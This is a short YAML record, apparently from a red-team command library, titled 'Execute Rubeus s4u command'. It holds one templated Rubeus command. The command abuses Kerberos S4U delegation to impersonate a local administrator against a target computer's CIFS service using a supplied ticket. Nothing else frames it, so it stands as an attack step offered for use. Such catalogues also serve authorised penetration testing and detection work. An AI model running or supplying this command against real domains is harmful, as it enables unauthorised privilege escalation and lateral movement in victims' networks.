---
id: 739dd119-6839-42b5-b9e3-63d7770f6bc8
name: Execute Rubeus s4u command
type: command
executor: bash
data: Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin}
  /ticket:${TGT} /nowrap
output: null
created_at: '2023-04-06T03:56:07.821578+00:00'
updated_at: '2023-04-10T20:36:07.954586+00:00'
---

# Execute Rubeus s4u command

```bash
Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
```
